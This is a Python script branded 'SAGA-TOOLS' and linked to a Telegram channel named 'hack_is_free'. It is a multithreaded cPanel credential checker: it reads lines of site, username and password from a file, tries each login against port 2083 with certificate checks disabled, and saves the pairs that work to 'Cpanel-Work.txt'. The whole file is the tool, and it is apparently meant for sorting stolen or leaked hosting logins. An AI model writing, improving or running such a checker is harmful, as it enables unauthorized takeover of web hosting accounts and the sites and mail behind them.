import re
import requests
from colorama import Fore, init, Style
from requests.auth import HTTPBasicAuth
import colorama
import threading

colorama.init(convert=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

print("""
[#] Create By ::

                          SAGA-TOOLS  https://t.me/hack_is_free  
                       Cpanel Checker ex : https://site:2083|user|pass
""")

requests.packages.urllib3.disable_warnings()

def check_cpanel(site):
    site = site.strip()
    data_cpanel = site

    try:
        ip, username, password = site.split('|')
        print(f" [*] Cpanel : {ip}")
        print(f" [*] Username : {username}")
        print(f" [*] Password : {password}")

        session = requests.Session()
        session.verify = False
        auth = HTTPBasicAuth(username, password)
        response = session.get(ip, auth=auth)

        if "email_accounts" in response.text:
            print(f" {fg}[+] Login successful{Style.RESET_ALL}")
            with open("Cpanel-Work.txt", "a") as out:
                out.write(f"{data_cpanel}\n")
        else:
            print(f" {fr}[-] Login Failed {Style.RESET_ALL}")

    except ValueError:
        print(f" {fr} [-] Login Failed: Invalid format {Style.RESET_ALL}")

    except Exception as e:
        print(f" {fr} [-] Login Failed: {e} {Style.RESET_ALL}")

try:
    sites_file = input("List Cpanels: ")

    with open(sites_file, "r") as sites:
        threads = []
        num_threads = int(input('Enter Your Threads : '))
        for site in sites:
            t = threading.Thread(target=check_cpanel, args=(site,))
            threads.append(t)
            t.start()

            if len(threads) >= num_threads:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

except FileNotFoundError:
    print(f" [!] File not found: {sites_file}")
except Exception as ex:
    print(f" [!] An error occurred: {ex}")
finally:
    print("Finished processing sites.")
